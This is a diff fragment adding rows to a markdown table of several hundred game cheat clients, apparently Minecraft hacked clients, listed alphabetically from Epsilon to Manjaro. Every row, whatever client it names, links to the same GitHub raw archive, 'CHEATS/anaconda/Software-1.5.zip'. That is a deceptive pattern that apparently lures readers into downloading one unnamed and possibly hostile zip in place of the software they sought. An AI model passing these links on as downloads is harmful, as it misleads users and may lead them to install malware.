+| Epsilon             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Epsilon+ / EpsilonPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip
+| EsoHack / gondal.club | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Estension | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Europa              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip    |
+| Evangelion          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Evaware | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| EvliEye             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Evo                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Exception | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Exeter              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| Existent            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| ExosWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Expensive           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Experium            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Extazyy | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ExVision            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| FabricHax           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Fabuls | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| FallenMod           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| FamilyFunPack       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| FartHack.cc         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| FDP                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| FemHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| FencingF+2 / FencingFPlusTwo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Ferox               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| Ferret              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| FerxaxenMod         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| FPSMaster | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Fira                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Fire                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| FireWork            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| FishHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| FiveGuys / 5Guys    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Fivve Xin | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Flawless | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Floppa              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| Fluidity            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Flux                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Fluxus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ForeverClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ForgeHax            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| FortniteHook | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Fractal | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Francium | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Francium 1.19+ | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Freemanatee         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip    |
+| FrogWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| FrostBurn | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| FuFuClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| FurryWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| Fusion | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Future              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| FutureX             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Fyra | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Galacticc | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Galactie            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| GameSense / GS      | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| GameSense++ / GameSensePlusPlus / GS++ / GSPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Gardenia | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Garuff              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| GateClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GateClient 1.19.2 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Gavhack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Gavhack+ / GavhackPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| GeraldHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GhostBleach | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GishCode            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Glacier             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Gladiator           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| GlassClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Gloom               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Glorium             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| GlowClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| GlyphClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GodClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| GoldGrinder | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GoonWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Gothaj | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Gothaj NextGen | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GrandLine | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GrassWare.win | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GrassWare.win Rewrite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Grim | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Guinness            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| GumTune | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| HackHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| HalalHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Hamster             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Hanabi              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| HANClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Haru | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Harvest             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| HayBale             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Hearse              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| HeavenClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Helios | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| HemHacks            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Hephaestus          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Hiassi.su           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| HilariousWare       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| HitlerHax           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Hitori              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Hmxix               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| HockeyWare          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| HOPE                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                         |
+| Horion              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Houdini.cc          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| HT+ Rewrite / HTPlus Rewrite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| HuqaloV             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Huzuni              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Huzuni+2 / HuzuniPlusTwo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Hydra               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                 |
+| HydraWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| HydraWare Plus / HydraWare+ | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Hydrogen            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| HyghLand.cc         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| HyperLethal         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Hypnotic            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ChachooxWare        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Charon.eu           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| CheatWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Cherry              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| ChickenWare         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| ChickenWings.cc     | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| ChipsHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| ChucKHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| ChungusWare         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| IceHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Ikea                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| ILClient            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Impact              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                |
+| Impact+ / ImpactPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| ImpHack / ImpHax    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Incoming            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Indium.cc           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Inertia             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                               |
+| Inertial            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Inferno             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Infinity | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Infinity            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| InfnityLoop | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| IngrosWare          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Invicta             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| InvincibilityHack   | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| ISUWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| iSync               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                    |
+| Jackey              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| JebHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| JesusHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| JexClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| JigokuSense         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Jigsaw              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                            |
+| JoblessClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| JorgitoHack         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| JuiceClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Juul                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KAMI                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Kami++ / KamiPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Kami5 / KamiFive    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kamiblue            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Kamiblue+ / KamibluePlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Kana                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Kaotik              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kappa | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kapuncion | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kawaii              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                    |
+| KBPW | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KeKWClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Kemmy.cc            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Ket                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Ketamine            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                    |
+| KettleHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KevinClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KiwiClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| KlaydixWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KnightHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Koks                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Konas               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Konc                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Korppu | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kull                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                         |
+| Kura | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kura NextGen | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KuroHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| KVN | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Kyino | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Lambda              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Lambda+ / LambdaPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| LanderClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Lantern             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| LavaHack / Kisman.cc | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| LBounce             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Leave               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Legacy              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Lemon | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Lemonade | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Lepton | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LeuxBackdoor        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| LifeLine            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Lime                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LiquidBounce        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| LiquidBounce+ / LiquidBouncePlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip     |
+| LiquidBounce+ Reborn / LiquidBouncePlus Reborn | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LiquidBounce++ / LiquidBouncePlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| LiquidCat           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Liquido             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| LiquidShadow        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| LiquidX             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Lirium | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ListedHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Litka | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LiveSense           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| LmaoBox | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LoseBypass          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| LoustHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Love                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Lover               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Luchadora           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| LuckyClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| LuigiHack / Alice   | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| LumaHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LumeMinus / Luma-   | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Lumen               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| Lumina Client | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Luna | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| LuneClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Lycoris | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Lycoris             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip|
+| Lynx                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| M3dC3t / MadCat     | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MacHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| MachineLite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| MackMod             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| MahanWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| Manjaro | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
